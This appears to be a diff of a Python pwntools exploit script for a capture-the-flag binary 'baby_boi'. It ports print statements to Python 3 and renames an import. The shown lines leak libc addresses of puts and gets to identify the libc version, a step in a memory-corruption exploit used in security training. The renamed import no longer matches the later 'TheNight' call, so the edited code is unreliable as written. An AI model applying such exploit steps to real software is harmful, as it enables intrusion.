@@ -1,6 +1,5 @@
-import TheNight
+import thenight
 from pwn import *
-
 
 # Establish the target
 target = process('./baby_boi')
@@ -37,8 +36,8 @@ putsLibc = u64(leak0 + "\x00"*(8-len(leak0)))
 leak1 = target.recvline().strip("\n")
 getsLibc = u64(leak1 + "\x00"*(8-len(leak1)))
 
-print "puts libc: " + hex(putsLibc)
-print "gets libc: " + hex(getsLibc)
+print("puts libc: %s" % hex(putsLibc))
+print("gets libc: %s" % hex(getsLibc))
 
 # Pass the leaks to The Night to figure out
 TheNight.findLibcVersion("puts", putsLibc, "gets", getsLibc)
